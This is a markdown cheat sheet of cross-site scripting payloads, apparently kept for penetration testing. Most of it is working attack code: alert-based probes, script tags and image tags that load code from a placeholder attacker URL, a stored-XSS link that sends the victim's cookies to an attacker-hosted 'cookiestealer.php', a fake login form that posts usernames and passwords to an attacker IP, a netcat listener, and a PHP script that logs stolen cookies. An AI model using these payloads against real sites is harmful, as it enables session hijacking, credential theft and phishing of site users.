# XSS Payloads List

Note: JavaScript and HTML code snippets are case insensitive.

## Detection

- HTML attributes

```
<h1>XSS header injection</h1>
<h2>XSS header injection</h2>
<h3>XSS header injection</h3>

```

- Javascript pop up

```
<script>alert(1)</script>
"><script>alert(1)</script>
<script>alert("XSS")</script>
<script>alert(document.cookie)</script>
```

## Attack Vector

### Port Scanning

```
<img src="http://[::]:8000/image.jpg"><img>
```

### HTML Attributes

- A list of payloads to inject links

```
<script>document.location="http[s]://<attacker_URL>/script.js"</script>
<script>window.location="http[s]://<attacker_URL>/script.js"</script>
<script src="http[s]://<attacker_URL>/script.js"></script>
<img src="http[s]://<attacker_URL>/script.js">
<svg src="http[s]://<attacker_URL>/script.js">
<iframe src="http[s]://<attacker_URL>/script.js">
```

### Inject JavaScript code

- XSS DOM object

```
http[s]://<IP>/index.php?<parameter_id>=<script>window.onload=function(){document.getElementsByName('<html_attribute_field>')[0].innerHTML='XSS is easy!';document.getElementById('<html_ID_attribute>').submit();}</script>

http[s]://<IP>/index.php?page=<script>window.onload=function(){document.getElementsByName('comment')[0].innerHTML='XSS is easy!';document.getElementById('post').submit();}</script>
```

- For stored XSS

```
<a href="https://www.google.com/search?q=what+is+xss" onmouseover="window.location='http[s]://<attacker_URL>/cookiestealer.php='+escape(document.cookie)"What is XSS?
```

### Phishing Templates

#### Harvest Cookies

##### Client Side

- Phishing Form

```html
<h3>Login</h3>
<form action=http://<attacker_IP>
Username:<br><input type="username" name="username"></br>
Password:<br><input type="password" name="password"></br>
<br><input type="submit" value="Logon"></br>
```

- One liners

```html
<h3>Login</h3><form action=http://<attacker_IP> Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```

##### Server Side

- Netcat listener

`$ nc -lnvp 80`

- PHP Cookie Stealer

```php
<?php
$cookie = $_GET['cookie'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' . $cookie . "\r\n");
fclose($fp);
?>
```

#### ClickJacking

TODO: Fill this info

#### Malvertising

TODO: Fill this info

## References

- [PayloadBox: XSS Payload List](https://github.com/payloadbox/xss-payload-list)

- [10 Practical scenarios for XSS attacks](https://pentest-tools.com/blog/xss-attacks-practical-scenarios)

- [Cobalt: A Pentesterâ€™s Guide to Cross-Site Scripting (XSS)](https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss)

- [Geeky much: Cross-site Scripting](https://medium.com/secure-you/cross-site-scripting-b64f440ae060)